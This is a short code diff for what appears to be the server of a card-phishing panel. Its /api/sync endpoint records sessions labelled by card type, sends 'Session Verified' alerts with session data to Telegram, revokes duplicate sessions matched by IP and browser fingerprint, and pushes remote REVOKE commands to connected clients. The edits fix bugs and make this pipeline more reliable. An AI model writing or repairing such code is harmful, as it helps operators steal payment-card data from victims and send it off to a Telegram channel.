@@ -304,7 +304,7 @@ const sendTelegram = (msg: string) => {
         method: 'POST',
         headers: {
             'Content-Type': 'application/json',
-            'Content-Length': data.length
+            'Content-Length': Buffer.byteLength(data)
         }
     };
     const req = https.request(options, res => {});
@@ -388,7 +388,7 @@ app.post('/api/sync', async (req, res) => {
 
             // Completed Session
             if (existing.status !== 'Verified' && data.status === 'Verified') {
-                 const cardType = data.cardType ? `[${data.cardType.toUpperCase()}]` : '[CARD]';
+                 const cardType = data.cardType ? `[${escapeHtml(data.cardType).toUpperCase()}]` : '[CARD]';
                  const title = `Session Verified ${cardType}`;
                  const msg = formatSessionForTelegram(data, title, flag);
                  sendTelegram(msg);
@@ -418,11 +418,18 @@ app.post('/api/sync', async (req, res) => {
 
         if (currentUA) {
             for (const s of userIpSessions) {
-                const sameUA = s.fingerprint?.userAgent === currentUA;
+                const sUA = s.fingerprint?.userAgent || '';
+                const sameUA = sUA === currentUA;
 
                 if (sameUA && s.id !== data.sessionId && s.status !== 'Verified' && s.status !== 'Revoked') {
+                    console.log(`[Sync] Revoking duplicate session ${s.id} (IP: ${ip})`);
                     s.status = 'Revoked';
                     await db.upsertSession(s.id, s, s.ip);
+
+                    // Force client to reset
+                    await db.queueCommand(s.id, 'REVOKE', {});
+                    io.to(s.id).emit('command', { action: 'REVOKE', payload: {} });
+
                     revokedCount++;
                 }
             }
